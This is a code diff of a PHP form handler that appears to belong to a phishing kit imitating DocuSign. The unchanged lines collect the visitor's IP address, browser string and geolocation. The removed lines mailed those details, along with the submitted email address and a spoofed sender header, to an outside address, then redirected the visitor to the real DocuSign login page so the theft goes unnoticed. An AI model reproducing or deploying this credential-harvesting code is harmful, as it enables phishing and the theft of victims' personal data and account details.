@@ -1,5 +1,5 @@
 <?
-include 'validate_form.js';
+include 'js/validate_form.js';
 $adddate=date("D M d, Y g:i a");
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $ip = getenv("REMOTE_ADDR");
@@ -30,13 +30,4 @@ $message .= "country: ".$tags['geobytescountry']."<br />";
 $message .= "continent: ".$tags['geobytesmapreference']."<br />";
 $message .= "Currency: ".$tags['geobytescurrency']."<br />";
 $message .= "Port: ".$port."<br />";
-$recipient = "helpdesk@wardmanuk.com";
-$subject = $tags['geobytescountry'];
-$headers .= "From: 0ff!c3"."<doc>";
-$headers .= $_POST['eMailAdd']."\n";
-mail($recipient,$subject,$message,$headers);
-mail($recipent,$subject,$message,$headers);
-header("Location: https://www.docusign.net/Member/authenticate.aspx");
-	  
-
 ?>
